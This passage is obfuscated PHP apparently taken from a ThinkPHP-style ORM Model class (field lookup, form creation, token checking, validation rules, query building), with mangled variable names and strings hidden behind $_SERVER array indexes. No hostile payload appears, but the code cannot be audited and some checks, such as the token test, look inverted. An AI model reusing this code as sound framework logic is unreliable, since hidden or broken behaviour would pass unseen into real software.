$_SERVER[ü¢ÙÊñÛ]; if ($…ŒŠˆØ•) { if (is_callable($…ŒŠˆØ•)) { return call_user_func($…ŒŠˆØ•, $ÑÑ¥¦í); } switch (strtolower($…ŒŠˆØ•)) { case $ùµÑµ×š[381]: return json_encode($ÑÑ¥¦í); case $ùµÑµ×š[382]: return xml_encode($ÑÑ¥¦í); } } return $ÑÑ¥¦í; } public function parseFieldsMap($˜Ğ¦ší¼, $ÙíÊÀÜû = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ï—é§Õœ => $úë”†­°) { if ($ÙíÊÀÜû == 1) { if (isset($˜Ğ¦ší¼[$úë”†­°])) { $˜Ğ¦ší¼[$Ï—é§Õœ] = $˜Ğ¦ší¼[$úë”†­°]; unset($˜Ğ¦ší¼[$úë”†­°]); } } else { if (isset($˜Ğ¦ší¼[$Ï—é§Õœ])) { $˜Ğ¦ší¼[$úë”†­°] = $˜Ğ¦ší¼[$Ï—é§Õœ]; unset($˜Ğ¦ší¼[$Ï—é§Õœ]); } } } } return $˜Ğ¦ší¼; } public function setField($‰ôçÔÚ, $½öª—í = '') { if (is_array($‰ôçÔÚ)) { $‹©…™Â§ = $‰ôçÔÚ; } else { $‹©…™Â§[$‰ôçÔÚ] = $½öª—í; } return $this->save($‹©…™Â§); } public function setAdd($éÆÌ÷®Õ, $ôÒíïßì = 1) { $ä¼µ¿ÙË =& $_SERVER[ü¢ÙÊñÛ]; $¡ë¤°Ûå = $éÆÌ÷®Õ . $ä¼µ¿ÙË[383] . $ôÒíïßì; if ($ôÒíïßì < 0) { $¡ë¤°Ûå = $éÆÌ÷®Õ . $ôÒíïßì; } return $this->setField($éÆÌ÷®Õ, array($ä¼µ¿ÙË[384], $¡ë¤°Ûå)); } public function getField($ŞÒˆ½â, $Æ“Øö“Œ = null) { $Ö•†µ–œ =& $_SERVER[ü¢ÙÊñÛ]; $…ÀÄšØ[$Ö•†µ–œ[362]] = $ŞÒˆ½â; $…ÀÄšØ = $this->_parseOptions($…ÀÄšØ); $ŞÒˆ½â = trim($ŞÒˆ½â); if (strpos($ŞÒˆ½â, $Ö•†µ–œ[60])) { if (!isset($…ÀÄšØ[$Ö•†µ–œ[379]])) { $…ÀÄšØ[$Ö•†µ–œ[379]] = is_numeric($Æ“Øö“Œ) ? $Æ“Øö“Œ : $Ö•†µ–œ[22]; } $¾«×Õ¼è = $this->db->select($…ÀÄšØ); if (!empty($¾«×Õ¼è)) { $¸¥Ğ´Çé = explode($Ö•†µ–œ[60], $ŞÒˆ½â); $ŞÒˆ½â = array_keys($¾«×Õ¼è[0]); $¤–ëç»Ò = array_shift($ŞÒˆ½â); $«æ©©Äº = array_shift($ŞÒˆ½â); $µÌÖµ¯ = array(); $²§·Ë™ = count($¸¥Ğ´Çé); foreach ($¾«×Õ¼è as $œµ±ÖÅá) { $©…ÎË¼ = $œµ±ÖÅá[$¤–ëç»Ò]; if (2 == $²§·Ë™) { $µÌÖµ¯[$©…ÎË¼] = $œµ±ÖÅá[$«æ©©Äº]; } else { $µÌÖµ¯[$©…ÎË¼] = is_string($Æ“Øö“Œ) ? implode($Æ“Øö“Œ, $œµ±ÖÅá) : $œµ±ÖÅá; } } return $µÌÖµ¯; } } else { if (!0 !== $Æ“Øö“Œ) { $…ÀÄšØ[$Ö•†µ–œ[379]] = is_numeric($Æ“Øö“Œ) ? $Æ“Øö“Œ : 1; } if ($Æ“Øö“Œ === $Ö•†µ–œ[344]) { unset($…ÀÄšØ[$Ö•†µ–œ[379]]); } $œµ±ÖÅá = $this->db->select($…ÀÄšØ); if (!empty($œµ±ÖÅá)) { if ($Æ“Øö“Œ === $Ö•†µ–œ[344]) { return reset($œµ±ÖÅá[0]); } if (!0 !== $Æ“Øö“Œ && 1 == $…ÀÄšØ[$Ö•†µ–œ[379]]) { return reset($œµ±ÖÅá[0]); } foreach ($œµ±ÖÅá as $ı§à·â) { $¾Í‹Â¯Ä[] = $ı§à·â[$ŞÒˆ½â]; } return $¾Í‹Â¯Ä; } } return null; } public function create($„ğÜ´†× = '', $Šº˜å¢˜ = '') { $¶°ÖÄÄà =& $_SERVER[ü¢ÙÊñÛ]; if (empty($„ğÜ´†×)) { $„ğÜ´†× = $_POST; } elseif (is_object($„ğÜ´†×)) { $„ğÜ´†× = get_object_vars($„ğÜ´†×); } if (empty($„ğÜ´†×) || !is_array($„ğÜ´†×)) { $this->error = think_lang($¶°ÖÄÄà[360]); return !1; } $„ğÜ´†× = $this->parseFieldsMap($„ğÜ´†×, 0); $Šº˜å¢˜ = $Šº˜å¢˜ ? $Šº˜å¢˜ : (!empty($„ğÜ´†×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¶°ÖÄÄà[362]])) { $Ûç•úÛÉ = $this->options[$¶°ÖÄÄà[362]]; unset($this->options[$¶°ÖÄÄà[362]]); } elseif ($Šº˜å¢˜ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ûç•úÛÉ = $this->insertFields; } elseif ($Šº˜å¢˜ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ûç•úÛÉ = $this->updateFields; } if (isset($Ûç•úÛÉ)) { if (is_string($Ûç•úÛÉ)) { $Ûç•úÛÉ = explode($¶°ÖÄÄà[60], $Ûç•úÛÉ); } if (think_config($¶°ÖÄÄà[385])) { $Ûç•úÛÉ[] = think_config($¶°ÖÄÄà[386]); } foreach ($„ğÜ´†× as $ÚœÜéõì => $ÙÑê¦¬) { if (!in_array($ÚœÜéõì, $Ûç•úÛÉ)) { unset($„ğÜ´†×[$ÚœÜéõì]); } } } if (!$this->autoValidation($„ğÜ´†×, $Šº˜å¢˜)) { return !1; } if (!$this->autoCheckToken($„ğÜ´†×)) { $this->error = think_lang($¶°ÖÄÄà[387]); return !1; } if ($this->autoCheckFields) { $Ûç•úÛÉ = $this->getDbFields(); foreach ($„ğÜ´†× as $ÚœÜéõì => $ÙÑê¦¬) { if (!in_array($ÚœÜéõì, $Ûç•úÛÉ)) { unset($„ğÜ´†×[$ÚœÜéõì]); } elseif (MAGIC_QUOTES_GPC && is_string($ÙÑê¦¬)) { $„ğÜ´†×[$ÚœÜéõì] = stripslashes($ÙÑê¦¬); } } } $this->autoOperation($„ğÜ´†×, $Šº˜å¢˜); $this->data = $„ğÜ´†×; return $„ğÜ´†×; } public function autoCheckToken($ïñş†×ª) { $ÌúºÄÕŸ =& $_SERVER[ü¢ÙÊñÛ]; if (isset($this->options[$ÌúºÄÕŸ[388]]) && !$this->options[$ÌúºÄÕŸ[388]]) { return !0; } if (think_config($ÌúºÄÕŸ[385])) { $×øÛåœ = think_config($ÌúºÄÕŸ[386]); if (!isset($ïñş†×ª[$×øÛåœ]) || Session::get($×øÛåœ)) { return !1; } list($ƒÒ•Šü, $¦Ø½¦€æ) = explode($ÌúºÄÕŸ[21], $ïñş†×ª[$×øÛåœ]); if ($¦Ø½¦€æ && Session::get($×øÛåœ . $ÌúºÄÕŸ[20] . $ƒÒ•Šü) === $¦Ø½¦€æ) { Session::remove($×øÛåœ . $ÌúºÄÕŸ[20] . $ƒÒ•Šü); return !0; } if (think_config($ÌúºÄÕŸ[389])) { Session::remove($×øÛåœ . $ÌúºÄÕŸ[20] . $ƒÒ•Šü); } return !1; } return !0; } public function regex($‰£êŠ, $ï´£›³’) { $²»ÅÁä× =& $_SERVER[ü¢ÙÊñÛ]; $À€Å–Ş‹ = array($²»ÅÁä×[390] => $²»ÅÁä×[391], $²»ÅÁä×[392] => $²»ÅÁä×[393], $²»ÅÁä×[394] => $²»ÅÁä×[395], $²»ÅÁä×[396] => $²»ÅÁä×[397], $²»ÅÁä×[398] => $²»ÅÁä×[399], $²»ÅÁä×[400] => $²»ÅÁä×[401], $²»ÅÁä×[402] => $²»ÅÁä×[403], $²»ÅÁä×[377] => $²»ÅÁä×[404], $²»ÅÁä×[405] => $²»ÅÁä×[406]); if (isset($À€Å–Ş‹[strtolower($ï´£›³’)])) { $ï´£›³’ = $À€Å–Ş‹[strtolower($ï´£›³’)]; } return preg_match($ï´£›³’, $‰£êŠ) === 1; } private function autoOperation(&$×ï°ğ†“, $äÊ´‚¨) { $Šä¨’«Ù =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($this->options[$Šä¨’«Ù[407]])) { $˜®®¸Ñí = $this->options[$Šä¨’«Ù[407]]; unset($this->options[$Šä¨’«Ù[407]]); } elseif (!empty($this->_auto)) { $˜®®¸Ñí = $this->_auto; } if (isset($˜®®¸Ñí)) { foreach ($˜®®¸Ñí as $€£¾€Ó¿) { if (empty($€£¾€Ó¿[2])) { $€£¾€Ó¿[2] = THINK_MODEL_INSERT; } if ($äÊ´‚¨ == $€£¾€Ó¿[2] || $€£¾€Ó¿[2] == THINK_MODEL_BOTH) { switch (trim($€£¾€Ó¿[3])) { case $Šä¨’«Ù[408]: case $Šä¨’«Ù[409]: $èª°²à÷ = isset($€£¾€Ó¿[4]) ? (array) $€£¾€Ó¿[4] : array(); if (isset($×ï°ğ†“[$€£¾€Ó¿[0]])) { array_unshift($èª°²à÷, $×ï°ğ†“[$€£¾€Ó¿[0]]); } if ($Šä¨’«Ù[408] == $€£¾€Ó¿[3]) { $×ï°ğ†“[$€£¾€Ó¿[0]] = call_user_func_array($€£¾€Ó¿[1], $èª°²à÷); } else { $×ï°ğ†“[$€£¾€Ó¿[0]] = call_user_func_array(array(&$this, $€£¾€Ó¿[1]), $èª°²à÷); } break; case $Šä¨’«Ù[362]: $×ï°ğ†“[$€£¾€Ó¿[0]] = $×ï°ğ†“[$€£¾€Ó¿[1]]; break; case $Šä¨’«Ù[410]: if ($Šä¨’«Ù[22] === $×ï°ğ†“[$€£¾€Ó¿[0]]) { unset($×ï°ğ†“[$€£¾€Ó¿[0]]); } break; case $Šä¨’«Ù[411]: default: $×ï°ğ†“[$€£¾€Ó¿[0]] = $€£¾€Ó¿[1]; } if (!1 === $×ï°ğ†“[$€£¾€Ó¿[0]]) { unset($×ï°ğ†“[$€£¾€Ó¿[0]]); } } } } return $×ï°ğ†“; } protected function autoValidation($‰©šìåŞ, $ç€íß±•) { $Ú²Ä•”ø =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($this->options[$Ú²Ä•”ø[412]])) { $ÉĞÕö‡ø = $this->options[$Ú²Ä•”ø[412]]; unset($this->options[$Ú²Ä•”ø[412]]); } elseif (!empty($this->_validate)) { $ÉĞÕö‡ø = $this->_validate; } if (isset($ÉĞÕö‡ø)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÉĞÕö‡ø as $°¦¡Òô— => $ÈÔŞ–) { if (empty($ÈÔŞ–[5]) || $ÈÔŞ–[5] == THINK_MODEL_BOTH || $ÈÔŞ–[5] == $ç€íß±•) { if (0 == strpos($ÈÔŞ–[2], $Ú²Ä•”ø[413]) && strpos($ÈÔŞ–[2], $Ú²Ä•”ø[414])) { $ÈÔŞ–[2] = think_lang(substr($ÈÔŞ–[2], 2, -1)); } $ÈÔŞ–[3] = isset($ÈÔŞ–[3]) ? $ÈÔŞ–[3] : THINK_EXISTS_VALIDATE; $ÈÔŞ–[4] = isset($ÈÔŞ–[4]) ? $ÈÔŞ–[4] : $Ú²Ä•”ø[415]; switch ($ÈÔŞ–[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($‰©šìåŞ, $ÈÔŞ–)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ú²Ä•”ø[22] != trim($‰©šìåŞ[$ÈÔŞ–[0]])) { if (!1 === $this->_validationField($‰©šìåŞ, $ÈÔŞ–)) { return !1; } } break; default: if (isset($‰©šìåŞ[$ÈÔŞ–[0]])) { if (!1 === $this->_validationField($‰©šìåŞ, $ÈÔŞ–)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Í¦¦ÒÀª, $ôşêå“¸) { if (!1 === $this->_validationFieldItem($Í¦¦ÒÀª, $ôşêå“¸)) { if ($this->patchValidate) { $this->error[$ôşêå“¸[0]] = $ôşêå“¸[2]; } else { $this->error = $ôşêå“¸[2]; return !1; } } return; } protected function _validationFieldItem($ÅÏ°Á€ô, $…ÌÔôåû) { $ªÈ²¾š =& $_SERVER[ü¢ÙÊñÛ]; switch (strtolower(trim($…ÌÔôåû[4]))) { case $ªÈ²¾š[408]: case $ªÈ²¾š[409]: $¢Ò§İ¡ã = isset($…ÌÔôåû[6]) ? (array) $…ÌÔôåû[6] : array(); if (is_string($…ÌÔôåû[0]) && strpos($…ÌÔôåû[0], $ªÈ²¾š[60])) { $…ÌÔôåû[0] = explode($ªÈ²¾š[60], $…ÌÔôåû[0]); } if (is_array($…ÌÔôåû[0])) { foreach ($…ÌÔôåû[0] as $¥º€ª¯¸) { $Ü¯æŠâ…[$¥º€ª¯¸] = $ÅÏ°Á€ô[$¥º€ª¯¸]; } array_unshift($¢Ò§İ¡ã, $Ü¯æŠâ…); } else { array_unshift($¢Ò§İ¡ã, $ÅÏ°Á€ô[$…ÌÔôåû[0]]); } if ($ªÈ²¾š[408] == $…ÌÔôåû[4]) { return call_user_func_array($…ÌÔôåû[1], $¢Ò§İ¡ã); } else { return call_user_func_array(array(&$this, $…ÌÔôåû[1]), $¢Ò§İ¡ã); } case $ªÈ²¾š[416]: return $ÅÏ°Á€ô[$…ÌÔôåû[0]] == $ÅÏ°Á€ô[$…ÌÔôåû[1]]; case $ªÈ²¾š[417]: if (is_string($…ÌÔôåû[0]) && strpos($…ÌÔôåû[0], $ªÈ²¾š[60])) { $…ÌÔôåû[0] = explode($ªÈ²¾š[60], $…ÌÔôåû[0]); } $ñ¡¢Õ–¶ = array(); if (is_array($…ÌÔôåû[0])) { foreach ($…ÌÔôåû[0] as $¥º€ª¯¸) { $ñ¡¢Õ–¶[$¥º€ª¯¸] = $ÅÏ°Á€ô[$¥º€ª¯¸]; } } else { $ñ¡¢Õ–¶[$…ÌÔôåû[0]] = $ÅÏ°Á€ô[$…ÌÔôåû[0]]; } if (!empty($ÅÏ°Á€ô[$this->getPk()])) { $ñ¡¢Õ–¶[$this->getPk()] = array($ªÈ²¾š[418], $ÅÏ°Á€ô[$this->getPk()]); } if ($this->where($ñ¡¢Õ–¶)->find()) { return !1; } return !0; default: return $this->check($ÅÏ°Á€ô[$…ÌÔôåû[0]], $…ÌÔôåû[1], $…ÌÔôåû[4]); } } public function check($ª£ƒ´ÎÅ, $×¤”ë†, $¦à”‡õí = "\162\x65\147\145\170") { $Æ®µÉŒ” =& $_SERVER[ü¢ÙÊñÛ]; $¦à”‡õí = strtolower(trim($¦à”‡õí)); switch ($¦à”‡õí) { case $Æ®µÉŒ”[17]: case $Æ®µÉŒ”[419]: $ˆÆå¼Ù¢ = is_array($×¤”ë†) ? $×¤”ë† : explode($Æ®µÉŒ”[60], $×¤”ë†); return $¦à”‡õí == $Æ®µÉŒ”[17] ? in_array($ª£ƒ´ÎÅ, $ˆÆå¼Ù¢) : !in_array($ª£ƒ´ÎÅ, $ˆÆå¼Ù¢); case $Æ®µÉŒ”[420]: case $Æ®µÉŒ”[421]: if (is_array($×¤”ë†)) { $½§÷”âÀ = $×¤”ë†[0]; $µ³ïº©× = $×¤”ë†[1]; } else { list($½§÷”âÀ, $µ³ïº©×) = explode($Æ®µÉŒ”[60], $×¤”ë†); } return $¦à”‡õí == $Æ®µÉŒ”[420] ? $ª£ƒ´ÎÅ >= $½§÷”âÀ && $ª£ƒ´ÎÅ <= $µ³ïº©× : $ª£ƒ´ÎÅ < $½§÷”âÀ || $ª£ƒ´ÎÅ > $µ³ïº©×; case $Æ®µÉŒ”[422]: case $Æ®µÉŒ”[423]: return $¦à”‡õí == $Æ®µÉŒ”[422] ? $ª£ƒ´ÎÅ == $×¤”ë† : $ª£ƒ´ÎÅ != $×¤”ë†; case $Æ®µÉŒ”[424]: $¼º™ŞÍ¿ = mb_strlen($ª£ƒ´ÎÅ, $Æ®µÉŒ”[425]); if (strpos($×¤”ë†, $Æ®µÉŒ”[60])) { list($½§÷”âÀ, $µ³ïº©×) = explode($Æ®µÉŒ”[60], $×¤”ë†); return $¼º™ŞÍ¿ >= $½§÷”âÀ && $¼º™ŞÍ¿ <= $µ³ïº©×; } else { return $¼º™ŞÍ¿ == $×¤”ë†; } case $Æ®µÉŒ”[426]: list($¼ÌÒ…”¼, $õëÑ¯ÀÌ) = explode($Æ®µÉŒ”[60], $×¤”ë†); if (!is_numeric($¼ÌÒ…”¼)) { $¼ÌÒ…”¼ = strtotime($¼ÌÒ…”¼); } if (!is_numeric($õëÑ¯ÀÌ)) { $õëÑ¯ÀÌ = strtotime($õëÑ¯ÀÌ); } return NOW_TIME >= $¼ÌÒ…”¼ && NOW_TIME <= $õëÑ¯ÀÌ; case $Æ®µÉŒ”[427]: return in_array(get_client_ip(), explode($Æ®µÉŒ”[60], $×¤”ë†)); case $Æ®µÉŒ”[428]: return !in_array(get_client_ip(), explode($Æ®µÉŒ”[60], $×¤”ë†)); case $Æ®µÉŒ”[415]: default: return $this->regex($ª£ƒ´ÎÅ, $×¤”ë†); } } public function query($Êˆ¯ş±®, $‹ø‰§œ¶ = false) { $¡à×µÉâ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_bool($‹ø‰§œ¶) && !is_array($‹ø‰§œ¶)) { $‹ø‰§œ¶ = func_get_args(); array_shift($‹ø‰§œ¶); } $Êˆ¯ş±® = str_replace(array($¡à×µÉâ[10], $¡à×µÉâ[429]), $¡à×µÉâ[63], $Êˆ¯ş±®); $Êˆ¯ş±® = $this->parseSql($Êˆ¯ş±®, $‹ø‰§œ¶); return $this->db->query($Êˆ¯ş±®); } public function execute($ªøç§‹, $ÏİˆÀ‡Ø = false) { if (!is_bool($ÏİˆÀ‡Ø) && !is_array($ÏİˆÀ‡Ø)) { $ÏİˆÀ‡Ø = func_get_args(); array_shift($ÏİˆÀ‡Ø); } $ªøç§‹ = $this->parseSql($ªøç§‹, $ÏİˆÀ‡Ø); return $this->db->execute($ªøç§‹); } protected function parseSql($¡‚ğæ˜‚, $¥ƒÜôõÜ) { $Æš‘åç† =& $_SERVER[ü¢ÙÊñÛ]; if (!0 === $¥ƒÜôõÜ) { $ÔÂù¨Ãã = $this->_parseOptions(); $¡‚ğæ˜‚ = $this->db->parseSql($¡‚ğæ˜‚, $ÔÂù¨Ãã); } elseif (is_array($¥ƒÜôõÜ)) { $¥ƒÜôõÜ = array_map(array($this->db, $Æš‘åç†[430]), $¥ƒÜôõÜ); $¡‚ğæ˜‚ = vsprintf($¡‚ğæ˜‚, $¥ƒÜôõÜ); } else { $¡‚ğæ˜‚ = strtr($¡‚ğæ˜‚, array($Æš‘åç†[431] => $this->getTableName(), $Æš‘åç†[432] => think_config($Æš‘åç†[333]))); } $this->db->setModel($this->name); return $¡‚ğæ˜‚; } public function db($ˆÜ„ûö½ = '', $à±ê©Õ = '', $°Íû²Š‡ = array()) { $°¬‚‰Ë =& $_SERVER[ü¢ÙÊñÛ]; if ($°¬‚‰Ë[22] === $ˆÜ„ûö½ && $this->db) { return $this->db; } static $‹úŒÑ× = array(); static $¸åğÇÎ– = array(); if (!isset($¸åğÇÎ–[$ˆÜ„ûö½]) || isset($¸åğÇÎ–[$ˆÜ„ûö½]) && $à±ê©Õ && $‹úŒÑ×[$ˆÜ„ûö½] != $à±ê©Õ) { if (!empty($à±ê©Õ) && is_string($à±ê©Õ) && !1 === strpos($à±ê©Õ, $°¬‚‰Ë[18])) { $à±ê©Õ = think_config($à±ê©Õ); } $ˆÜ„ûö½ = think_guid($à±ê©Õ); $¸åğÇÎ–[$ˆÜ„ûö½] = Db::getInstance($à±ê©Õ); } elseif (NULL === $à±ê©Õ) { $¸åğÇÎ–[$ˆÜ„ûö½]->close(); unset($¸åğÇÎ–[$ˆÜ„ûö½]); return; } if (!empty($°Íû²Š‡)) { if (is_string($°Íû²Š‡)) { parse_str($°Íû²Š‡, $°Íû²Š‡); } foreach ($°Íû²Š‡ as $¡ƒÇ›È÷ => $ğ°•øç) { $this->setProperty($¡ƒÇ›È÷, $ğ°•øç); } } $‹úŒÑ×[$ˆÜ„ûö½] = $à±ê©Õ; $this->db = $¸åğÇÎ–[$ˆÜ„ûö½]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $šˆì›Ÿí = get_class($this); if ($šˆì›Ÿí == $_SERVER[ü¢ÙÊñÛ][433]) { return $this->name; } $this->name = substr($šˆì›Ÿí, 0, -5); } return $this->name; } public function getTableName() { $´Ô¼îÕ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($this->trueTableName)) { $‘ü¯ÛÁè = !empty($this->tablePrefix) ? $this->tablePrefix : $´Ô¼îÕ[22]; if (!empty($this->tableName)) { $‘ü¯ÛÁè .= $this->tableName; } else { $‘ü¯ÛÁè .= think_parse_name($this->name); } $this->trueTableName = strtolower($‘ü¯ÛÁè); } return (!empty($this->dbName) ? $this->dbName . $´Ô¼îÕ[20] : $´Ô¼îÕ[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¬Ñù± =& $_SERVER[ü¢ÙÊñÛ]; return isset($this->fields[$¬Ñù±[340]]) ? $this->fields[$¬Ñù±[340]] : $this->pk; } public function getDbFields() { $¬ù¦¶²Ù =& $_SERVER[ü¢ÙÊñÛ]; if (isset($this->options[$¬ù¦¶²Ù[368]])) { $ì·Öœş™ = $this->db->getFields($this->options[$¬ù¦¶²Ù[368]]); return $ì·Öœş™ ? array_keys($ì·Öœş™) : !1; } if ($this->fields) { $ì·Öœş™ = $this->fields; unset($ì·Öœş™[$¬ù¦¶²Ù[339]], $ì·Öœş™[$¬ù¦¶²Ù[340]], $ì·Öœş™[$¬ù¦¶²Ù[341]], $ì·Öœş™[$¬ù¦¶²Ù[338]]); return $ì·Öœş™; } return !1; } public function data($áå×Ú‘Ö = '') { $ƒí–å² =& $_SERVER[ü¢ÙÊñÛ]; if ($ƒí–å²[22] === $áå×Ú‘Ö && !empty($this->data)) { return $this->data; } if (is_object($áå×Ú‘Ö)) { $áå×Ú‘Ö = get_object_vars($áå×Ú‘Ö); } elseif (is_string($áå×Ú‘Ö)) { parse_str($áå×Ú‘Ö, $áå×Ú‘Ö); } elseif (!is_array($áå×Ú‘Ö)) { think_exception(think_lang($ƒí–å²[360])); } $this->data = $áå×Ú‘Ö; return $this; } public function join($‘ŸÏáõÖ) { $é¡™°Óä =& $_SERVER[ü¢ÙÊñÛ]; if (is_array($‘ŸÏáõÖ)) { $this->options[$é¡™°Óä[371]] = $‘ŸÏáõÖ; } elseif (!empty($‘ŸÏáõÖ)) { $this->options[$é¡™°Óä[371]][] = $‘ŸÏáõÖ; } return $this; } public function union($†Â­‹¦ê, $£Æ¨·ôô = false) { $¬œ»¨“ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($†Â­‹¦ê)) { return $this; } if ($£Æ¨·ôô) { $this->options[$¬œ»¨“[434]][$¬œ»¨“[435]] = !0; } if (is_object($†Â­‹¦ê)) { $†Â­‹¦ê = get_object_vars($†Â­‹¦ê); } if (is_string($†Â­‹¦ê)) { $Ï‰—ÉÃİ = $†Â­‹¦ê; } elseif (is_array($†Â­‹¦ê)) { if (isset($†Â­‹¦ê[0])) { $this->options[$¬œ»¨“[434]] = array_merge($this->options[$¬œ»¨“[434]], $†Â­‹¦ê); return $this; } else { $Ï‰—ÉÃİ = $†Â­‹¦ê; } } else { think_exception(think_lang($¬œ»¨“[360])); } $this->options[$¬œ»¨“[434]][] = $Ï‰—ÉÃİ; return $this; } public function cache($çÙ“µ› = true, $íÅôé˜Ó = null, $²ÇôÊŞ = '') { $ÊÙ³©£ =& $_SERVER[ü¢ÙÊñÛ]; if (!1 !== $çÙ“µ›) { $this->options[$ÊÙ³©£[436]] = array($ÊÙ³©£[108] => $çÙ“µ›, $ÊÙ³©£[426] => $íÅôé˜Ó, $ÊÙ³©£[43] => $²ÇôÊŞ); } return $this; } public function field($¯°Ø›‘ğ, $ùõÌÉÈé = false) { $óê ™ç» =& $_SERVER[ü¢ÙÊñÛ]; if (!0 === $¯°Ø›‘ğ) { $ûé¤”äø = $this->getDbFields(); $¯°Ø›‘ğ = $ûé¤”äø ? $ûé¤”äø : $óê ™ç»[233]; } elseif ($ùõÌÉÈé) { if (is_string($¯°Ø›‘ğ)) { $¯°Ø›‘ğ = explode($óê ™ç»[60], $¯°Ø›‘ğ); } $ûé¤”äø = $this->getDbFields(); $¯°Ø›‘ğ = $ûé¤”äø ? array_diff($ûé¤”äø, $¯°Ø›‘ğ) : $¯°Ø›‘ğ; } $this->options[$óê ™ç»[362]] = $¯°Ø›‘ğ; return $this; } public function scope($­½¼­”á = '', $Û­®â£ù = NULL) { $ßĞÚ×¹µ =& $_SERVER[ü¢ÙÊñÛ]; if ($ßĞÚ×¹µ[22] === $­½¼­”á) { if (isset($this->_scope[$ßĞÚ×¹µ[47]])) { $Ì´õúòÎ = $this->_scope[$ßĞÚ×¹µ[47]]; } else { return $this; } } elseif (is_string($­½¼­”á)) { $˜ëĞ©¬Ë = explode($ßĞÚ×¹µ[60], $­½¼­”á); $Ì´õúòÎ = array(); foreach ($˜ëĞ©¬Ë as $·ıòÜÓª) { if (!isset($this->_scope[$·ıòÜÓª])) { continue; } $Ì´õúòÎ = array_merge($Ì´õúòÎ, $this->_scope[$·ıòÜÓª]); } if (!empty($Û­®â£ù) && is_array($Û­®â£ù)) { $Ì´õúòÎ = array_merge($Ì´õúòÎ, $Û­®â£ù); } } elseif (is_array($­½¼­”á)) { $Ì´õúòÎ = $­½¼­”á; } if (is_array($Ì´õúòÎ) && !empty($Ì´õúòÎ)) { $this->options = array_merge($this->options, array_change_key_case($Ì´õúòÎ)); } return $this; } public function where($¼ÙÙ…ÑÃ, $÷Êõ‰×Æ = null) { $½ë±óË =& $_SERVER[ü¢ÙÊñÛ]; if (!is_null($÷Êõ‰×Æ) && is_string($¼ÙÙ…ÑÃ)) { if (!is_array($÷Êõ‰×Æ)) { $÷Êõ‰×Æ = func_get_args(); array_shift($÷Êõ‰×Æ); } $÷Êõ‰×Æ = array_map(array($this->db, $½ë±óË[430]), $÷Êõ‰×Æ); $¼ÙÙ…ÑÃ = vsprintf($¼ÙÙ…ÑÃ, $÷Êõ‰×Æ); } elseif (is_object($¼ÙÙ…ÑÃ)) { $¼ÙÙ…ÑÃ = get_object_vars($¼ÙÙ…ÑÃ); } elseif (is_array($¼ÙÙ…ÑÃ)) { foreach ($¼ÙÙ…ÑÃ as $µ¦á²§ => $ÚºÉ ¾Æ) { if ((is_numeric($µ¦á²§) || !$µ¦á²§) && is_string($ÚºÉ ¾Æ)) { if (strpos($ÚºÉ ¾Æ, $½ë±óË[437]) === 0) { continue; } think_trace($½ë±óË[438], $½ë±óË[22], $½ë±óË[59]); die; } } } if (is_string($¼ÙÙ…ÑÃ) && $½ë±óË[22] != $¼ÙÙ…ÑÃ) { $ù…û›Û› = array(); $ù…û›Û›[$½ë±óË[439]] = $¼ÙÙ…ÑÃ; $¼ÙÙ…ÑÃ = $ù…û›Û›; } if (isset($this->options[$½ë±óË[364]])) { $this->options[$½ë±óË[364]] = array_merge($this->options[$½ë±óË[364]], $¼ÙÙ…ÑÃ); } else { $this->options[$½ë±óË[364]] = $¼ÙÙ…ÑÃ; } return $this; } public function limit($‚•”í ¿, $÷„ ûÉ = null) { $ëŞ”’ü¬ =& $_SERVER[ü¢ÙÊñÛ]; $this->options[$ëŞ”’ü¬[379]] = is_null($÷„ ûÉ) ? $‚•”í ¿ : $‚•”í ¿ . $ëŞ”’ü¬[60] . $÷„ ûÉ; return $this; } public function page($ƒ¸¬¨…, $¡ë•é²Ü = null) { $õƒÆ•ˆà =& $_SERVER[ü¢ÙÊñÛ]; $this->options[$õƒÆ•ˆà[440]] = is_null($¡ë•é²Ü) ? $ƒ¸¬¨… : $ƒ¸¬¨… . $õƒÆ•ˆà[60] . $¡ë•é²Ü; return $this; } public function comment($¤•ş­á) { $this->options[$_SERVER[ü¢ÙÊñÛ][441]] = $¤•ş­á; return $this; } public function setProperty($÷¨×·³ç, $æ¥í¯à´) { if (property_exists($this, $÷¨×·³ç)) { $this->{$÷¨×·³ç} = $æ¥í¯à´; } return $this; } } goto bËÍÏ–Òìî; bËÍÏ–Òìî: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\145\x72\164\x2c\165\x70\144\x61\x74\x65", "\146\x75\156\143\164\x69\x6f\156"), array("\143\x72\x65\x61\164\x65\x54\x69\155\x65", "\164\x69\155\145", "\x69\x6e\x73\145\162\x74", "\146\165\156\x63\164\151\157\156")); public function setDataAuto($§«œŸ„») { $this->dataAuto = $§«œŸ„»; } public function __construct($•›‹Æã = '', $ğÖìÁº‰ = '', $èÜÂ¦ò = '') { parent::__construct($•›‹Æã, $ğÖìÁº‰, $èÜÂ¦ò); } protected $tableMeta = array(); protected function _beforeInsert(&$€¡Ğ÷“Š, $‘™Â¯€) { $£ï©½ º =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->checkDataAutoHas($£ï©½ º[442])) { return; } $this->dataBeforeFilter($€¡Ğ÷“Š, $£ï©½ º[442]); } protected function _beforeUpdate(&$é–‰‚„Æ, $õ§Çı€â) { $ßÛ¢‚œ¿ 